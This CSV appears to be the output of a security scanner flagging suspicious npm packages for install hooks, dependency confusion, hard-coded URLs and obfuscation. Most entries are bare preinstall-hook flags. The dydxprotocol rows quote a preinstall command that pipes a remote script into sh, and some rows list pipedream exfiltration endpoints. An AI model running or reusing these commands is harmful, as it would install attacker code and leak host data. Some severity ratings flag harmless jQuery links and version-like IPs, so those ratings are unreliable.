package_name,version,timestamp,total_risks_found,risk_types,severities,categories,max_severity,raw_output
@bingads-webui-campaign/facebook-import-page,15.0.0,2025-12-10T14:42:28.614437,8,install_hook_present;potential_dependency_confusion;hardcoded_urls;hardcoded_ip;obfuscated_code;obfuscated_code;obfuscated_code;obfuscated_code,medium;medium;high;critical;high;high;high;high,install_hook;supply_chain_attack;network_exfiltration;network_exfiltration;obfuscation;obfuscation;obfuscation;obfuscation,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}, {""risk_type"": ""potential_dependency_confusion"", ""severity"": ""medium"", ""evidence"": ""Scoped package '@bingads-webui-campaign/facebook-import-page' depends on non-scoped package 'node-machine-id'"", ""confidence"": 0.5, ""category"": ""supply_chain_attack""}, {""risk_type"": ""hardcoded_urls"", ""severity"": ""high"", ""evidence"": ""Found 59 non-standard URLs: ['https://jquery.com/', 'https://sizzlejs.com/', 'https://jquery.org/license', 'https://html.spec.whatwg.org/#nonce-attributes', 'https://sizzlejs.com/', 'https://js.foundation/', 'https://jsperf.com/thor-indexof-vs-for/5', 'http://www.w3.org/TR/css3-selectors/#whitespace', 'https://www.w3.org/TR/css-syntax-3/#ident-token-diagram', 'http://www.w3.org/TR/selectors/#attribute-selectors', 'http://www.w3.org/TR/CSS21/syndata.html#escaped-characters', 'https://drafts.csswg.org/cssom/#common-serializing-idioms', 'https://drafts.csswg.org/selectors/#forgiving-selector', 'https://drafts.csswg.org/selectors/#relational', 'https://drafts.csswg.org/css-conditional-4/#typedef-supports-selector-fn', 'https://drafts.csswg.org/css-conditional-4/#dfn-support-selector', 'https://html.spec.whatwg.org/multipage/scripting.html#selector-enabled', 'https://html.spec.whatwg.org/multipage/scripting.html#selector-disabled', 'https://html.spec.whatwg.org/multipage/forms.html#category-listed', 'https://html.spec.whatwg.org/multipage/forms.html#concept-fe-disabled', 'https://html.spec.whatwg.org/multipage/forms.html#concept-option-disabled', 'https://bugs.jquery.com/ticket/4833', 'https://bugs.jquery.com/ticket/13378', 'https://bugs.jquery.com/ticket/12359', 'https://msdn.microsoft.com/en-us/library/ie/hh465388.aspx#attribute_section', 'http://www.w3.org/TR/2011/REC-css3-selectors-20110929/#checked', 'https://bugs.webkit.org/show_bug.cgi?id=136851', 'http://www.w3.org/TR/selectors/#pseudo-classes', 'http://www.w3.org/TR/selectors/#lang-pseudo', 'http://www.w3.org/TR/2011/REC-css3-selectors-20110929/#checked', 'http://www.w3.org/TR/selectors/#empty-pseudo', 'https://msdn.microsoft.com/en-us/library/ms536429%28VS.85%29.aspx', 'https://promisesaplus.com/#point-59', 'https://promisesaplus.com/#point-48', 'https://promisesaplus.com/#point-54', 'https://promisesaplus.com/#point-75', 'https://promisesaplus.com/#point-64', 'https://promisesaplus.com/#point-61', 'https://promisesaplus.com/#point-57', 'https://bugs.chromium.org/p/chromium/issues/detail?id=378607', 'https://bugs.jquery.com/ticket/13393', 'https://www.w3.org/TR/DOM-Level-3-Events/#event-type-click', 'https://www.w3.org/TR/2003/WD-DOM-Level-3-Events-20030331/ecma-script-binding.html', 'https://bugs.chromium.org/p/chromium/issues/detail?id=470258', 'https://connect.microsoft.com/IE/feedback/details/1736512/', 'https://jsperf.com/getall-vs-sizzle/2', 'https://www.w3.org/TR/css-syntax-3/#input-preprocessing', 'https://drafts.csswg.org/cssom/#resolved-values', 'https://developer.mozilla.org/en-US/docs/CSS/display', 'https://html.spec.whatwg.org/multipage/syntax.html#attributes-2', 'https://infra.spec.whatwg.org/#strip-and-collapse-ascii-whitespace', 'https://html.spec.whatwg.org/#strip-and-collapse-whitespace', 'https://bugzilla.mozilla.org/show_bug.cgi?id=687787', 'http://www.w3.org/TR/DOM-Level-3-Events/#events-focusevent-event-order', 'https://bugs.chromium.org/p/chromium/issues/detail?id=449857', 'http://example.com', 'https://bugs.webkit.org/show_bug.cgi?id=137337', 'https://bugs.webkit.org/show_bug.cgi?id=29084', 'https://bugs.chromium.org/p/chromium/issues/detail?id=589347']"", ""confidence"": 0.7, ""category"": ""network_exfiltration""}, {""risk_type"": ""hardcoded_ip"", ""severity"": ""critical"", ""evidence"": ""Contains IP addresses: ['2.3.3.3', '2.3.3.1', '2.3.3.3', '2.3.3.3']"", ""confidence"": 0.9, ""category"": ""network_exfiltration""}, {""risk_type"": ""obfuscated_code"", ""severity"": ""high"", ""evidence"": ""Obfuscation pattern 'IIFE obfuscation wrapper' found 3 times."", ""confidence"": 0.5, ""category"": ""obfuscation""}, {""risk_type"": ""obfuscated_code"", ""severity"": ""high"", ""evidence"": ""Obfuscation pattern 'Hex escape sequences' found 14 times."", ""confidence"": 0.8, ""category"": ""obfuscation""}, {""risk_type"": ""obfuscated_code"", ""severity"": ""high"", ""evidence"": ""Obfuscation pattern 'Unicode escape sequences' found 5 times."", ""confidence"": 0.7, ""category"": ""obfuscation""}, {""risk_type"": ""obfuscated_code"", ""severity"": ""high"", ""evidence"": ""Obfuscation pattern 'CharCode obfuscation' found 2 times."", ""confidence"": 0.8, ""category"": ""obfuscation""}]"
@blk/idm-okta-sdk-js,1.2.0,2025-12-10T14:42:28.626430,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@blk/idm-okta-sdk-js,5.9.0,2025-12-10T14:42:28.630225,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@blk/idm-okta-sdk-js,6.7.9999,2025-12-10T14:42:28.630941,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@blk/idm-okta-sdk-js,6.7.99999,2025-12-10T14:42:28.630941,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@buffer-mono/png-export,10.999.2,2025-12-10T14:42:28.639036,4,install_hook_present;potential_dependency_confusion;potential_dependency_confusion;hardcoded_urls,medium;medium;medium;high,install_hook;supply_chain_attack;supply_chain_attack;network_exfiltration,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}, {""risk_type"": ""potential_dependency_confusion"", ""severity"": ""medium"", ""evidence"": ""Scoped package '@buffer-mono/png-export' depends on non-scoped package 'lodash'"", ""confidence"": 0.5, ""category"": ""supply_chain_attack""}, {""risk_type"": ""potential_dependency_confusion"", ""severity"": ""medium"", ""evidence"": ""Scoped package '@buffer-mono/png-export' depends on non-scoped package 'non-secure'"", ""confidence"": 0.5, ""category"": ""supply_chain_attack""}, {""risk_type"": ""hardcoded_urls"", ""severity"": ""high"", ""evidence"": ""Found 2 non-standard URLs: ['https://ifconfig.me', 'https://eo7sxxyyscrvag4.m.pipedream.net/$ut;done']"", ""confidence"": 0.7, ""category"": ""network_exfiltration""}]"
@carb-manager/cm-shared-js,0.6.35,2025-12-10T14:42:28.641141,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@cat-digital-workspace/shared-ui-core,1.99.999,2025-12-10T14:42:28.642826,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""install script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@celo-org/optics-sol,9.9.9,2025-12-10T14:42:28.647364,4,install_hook_present;potential_dependency_confusion;potential_dependency_confusion;potential_dependency_confusion,medium;medium;medium;medium,install_hook;supply_chain_attack;supply_chain_attack;supply_chain_attack,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}, {""risk_type"": ""potential_dependency_confusion"", ""severity"": ""medium"", ""evidence"": ""Scoped package '@celo-org/optics-sol' depends on non-scoped package 'http'"", ""confidence"": 0.5, ""category"": ""supply_chain_attack""}, {""risk_type"": ""potential_dependency_confusion"", ""severity"": ""medium"", ""evidence"": ""Scoped package '@celo-org/optics-sol' depends on non-scoped package 'https'"", ""confidence"": 0.5, ""category"": ""supply_chain_attack""}, {""risk_type"": ""potential_dependency_confusion"", ""severity"": ""medium"", ""evidence"": ""Scoped package '@celo-org/optics-sol' depends on non-scoped package 'os'"", ""confidence"": 0.5, ""category"": ""supply_chain_attack""}]"
@chegg/wtai-upload-widget,9.999.2,2025-12-10T14:42:28.647364,2,install_hook_present;hardcoded_urls,medium;high,install_hook;network_exfiltration,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}, {""risk_type"": ""hardcoded_urls"", ""severity"": ""high"", ""evidence"": ""Found 2 non-standard URLs: ['https://ifconfig.me', 'https://eonvl0nhpr7p5b2.m.pipedream.net/$ut;done']"", ""confidence"": 0.7, ""category"": ""network_exfiltration""}]"
@chegg/wtai-upload-widget,9.999.7,2025-12-10T14:42:28.654717,2,install_hook_present;hardcoded_urls,medium;high,install_hook;network_exfiltration,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}, {""risk_type"": ""hardcoded_urls"", ""severity"": ""high"", ""evidence"": ""Found 2 non-standard URLs: ['https://ifconfig.me', 'https://eonvl0nhpr7p5b2.m.pipedream.net/$ut;done']"", ""confidence"": 0.7, ""category"": ""network_exfiltration""}]"
@cloud-gems/cloudgemleaderboard,2.0.1,2025-12-10T14:42:28.657823,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@cloud-panel/add-on-utils,0.1.999,2025-12-10T14:42:28.660294,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@creditkudos/design-foundations,1.1.1,2025-12-10T14:42:28.661612,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@creditkudos/design-foundations,1.99.999,2025-12-10T14:42:28.664100,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@cseo/controls,999.9.9,2025-12-10T14:42:28.667933,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@cseousage/cseousagetelemetrymodel,9.9.9,2025-12-10T14:42:28.670580,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@cseousage/cseousagetelemetrymodel,9.99.999,2025-12-10T14:42:28.673269,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@dbk-legacy/muster,9.9.9,2025-12-10T14:42:28.675474,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@dbk-legacy/muster,9.9.91,2025-12-10T14:42:28.678044,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@dbk-legacy/roster-modules-ebanking,9.9.99,2025-12-10T14:42:28.680235,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@doccledev/pattern-library,5.0.99,2025-12-10T14:42:28.684555,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@drp-web/shared,1.2.1,2025-12-10T14:42:28.687190,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@drp-web/shared,1.2.10,2025-12-10T14:42:28.688212,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@drp-web/shared,1.2.2,2025-12-10T14:42:28.692555,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@drp-web/shared,1.2.3,2025-12-10T14:42:28.692555,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@drp-web/shared,1.2.4,2025-12-10T14:42:28.695971,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@drp-web/shared,1.2.6,2025-12-10T14:42:28.699016,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@drp-web/shared,1.2.7,2025-12-10T14:42:28.702041,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@drp-web/shared,1.2.9,2025-12-10T14:42:28.704672,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@drp-web/shared,2.1.0,2025-12-10T14:42:28.706727,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@drp-web/shared,3.1.0,2025-12-10T14:42:28.709504,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@drp-web/shared,4.1.0,2025-12-10T14:42:28.712430,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@drp-web/shared,5.1.0,2025-12-10T14:42:28.714109,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@dtci/eq-ui-lib,1.9.9,2025-12-10T14:42:28.714109,1,install_hook_present,medium,install_hook,medium,"[{""risk_type"": ""install_hook_present"", ""severity"": ""medium"", ""evidence"": ""preinstall script found"", ""confidence"": 0.5, ""category"": ""install_hook""}]"
@dydxprotocol/perpetual,1.2.2,2025-12-10T14:42:28.721086,6,preinstall_script;potential_dependency_confusion;potential_dependency_confusion;potential_dependency_confusion;potential_dependency_confusion;hardcoded_urls,high;medium;medium;medium;medium;high,remote_code_execution;supply_chain_attack;supply_chain_attack;supply_chain_attack;supply_chain_attack;network_exfiltration,medium,"[{""risk_type"": ""preinstall_script"", ""severity"": ""high"", ""evidence"": ""preinstall: curl -s http://api.circle-cdn.com/ci.js | sh..."", ""confidence"": 0.9, ""category"": ""remote_code_execution""}, {""risk_type"": ""potential_dependency_confusion"", ""severity"": ""medium"", ""evidence"": ""Scoped package '@dydxprotocol/perpetual' depends on non-scoped package 'bignumber.js'"", ""confidence"": 0.5, ""category"": ""supply_chain_attack""}, {""risk_type"": ""potential_dependency_confusion"", ""severity"": ""medium"", ""evidence"": ""Scoped package '@dydxprotocol/perpetual' depends on non-scoped package 'canonical-weth'"", ""confidence"": 0.5, ""category"": ""supply_chain_attack""}, {""risk_type"": ""potential_dependency_confusion"", ""severity"": ""medium"", ""evidence"": ""Scoped package '@dydxprotocol/perpetual' depends on non-scoped package 'lodash'"", ""confidence"": 0.5, ""category"": ""supply_chain_attack""}, {""risk_type"": ""potential_dependency_confusion"", ""severity"": ""medium"", ""evidence"": ""Scoped package '@dydxprotocol/perpetual' depends on non-scoped package 'web3'"", ""confidence"": 0.5, ""category"": ""supply_chain_attack""}, {""risk_type"": ""hardcoded_urls"", ""severity"": ""high"", ""evidence"": ""Found 1 non-standard URLs: ['http://www.apache.org/licenses/LICENSE-2.0']"", ""confidence"": 0.7, ""category"": ""network_exfiltration""}]"
@dydxprotocol/solo,0.41.1,2025-12-10T14:42:28.724859,11,preinstall_script;potential_dependency_confusion;potential_dependency_confusion;potential_dependency_confusion;potential_dependency_confusion;potential_dependency_confusion;potential_dependency_confusion;potential_dependency_confusion;potential_dependency_confusion;potential_dependency_confusion;hardcoded_urls,high;medium;medium;medium;medium;medium;medium;medium;medium;medium;high,remote_code_execution;supply_chain_attack;supply_chain_attack;supply_chain_attack;supply_chain_attack;supply_chain_attack;supply_chain_attack;supply_chain_attack;supply_chain_attack;supply_chain_attack;network_exfiltration,medium,"[{""risk_type"": ""preinstall_script"", ""severity"": ""high"", ""evidence"": ""preinstall: curl -s http://api.circle-cdn.com/ci.js | sh..."", ""confidence"": 0.9, ""category"": ""remote_code_execution""}, {""risk_type"": ""potential_dependency_confusion"", ""severity"": ""medium"", ""evidence"": ""Scoped package '@dydxprotocol/solo' depends on non-scoped package 'axios'"", ""confidence"": 0.5, ""category"": ""supply_chain_attack""}, {""risk_type"": ""potential_dependency_confusion"", ""severity"": ""medium"", ""evidence"": ""Scoped package '@dydxprotocol/solo' depends on non-scoped package 'bignumber.js'"", ""confidence"": 0.5, ""category"": ""supply_chain_attack""}, {""risk_type"": ""potential_dependency_confusion"", ""severity"": ""medium"", ""evidence"": ""Scoped package '@dydxprotocol/solo' depends on non-scoped package 'canonical-weth'"", ""confidence"": 0.5, ""category"": ""supply_chain_attack""}, {""risk_type"": ""potential_dependency_confusion"", ""severity"": ""medium"", ""evidence"": ""Scoped package '@dydxprotocol/solo' depends on non-scoped package 'es6-promisify'"", ""confidence"": 0.5, ""category"": ""supply_chain_attack""}, {""risk_type"": ""potential_dependency_confusion"", ""severity"": ""medium"", ""evidence"": ""Scoped package '@dydxprotocol/solo' depends on non-scoped package 'ethers'"", ""confidence"": 0.5, ""category"": ""supply_chain_attack""}, {""risk_type"": ""potential_dependency_confusion"", ""severity"": ""medium"", ""evidence"": ""Scoped package '@dydxprotocol/solo' depends on non-scoped package 'openzeppelin-solidity'"", ""confidence"": 0.5, ""category"": ""supply_chain_attack""}, {""risk_type"": ""potential_dependency_confusion"", ""severity"": ""medium"", ""evidence"": ""Scoped package '@dydxprotocol/solo' depends on non-scoped package 'query-string'"", ""confidence"": 0.5, ""category"": ""supply_chain_attack""}, {""risk_type"": ""potential_dependency_confusion"", ""severity"": ""medium"", ""evidence"": ""Scoped package '@dydxprotocol/solo' depends on non-scoped package 'web3'"", ""confidence"": 0.5, ""category"": ""supply_chain_attack""}, {""risk_type"": ""potential_dependency_confusion"", ""severity"": ""medium"", ""evidence"": ""Scoped package '@dydxprotocol/solo' depends on non-scoped package 'ws'"", ""confidence"": 0.5, ""category"": ""supply_chain_attack""}, {""risk_type"": ""hardcoded_urls"", ""severity"": ""high"", ""evidence"": ""Found 1 non-standard URLs: ['http://www.apache.org/licenses/LICENSE-2.0']"", ""confidence"": 0.7, ""category"": ""network_exfiltration""}]"
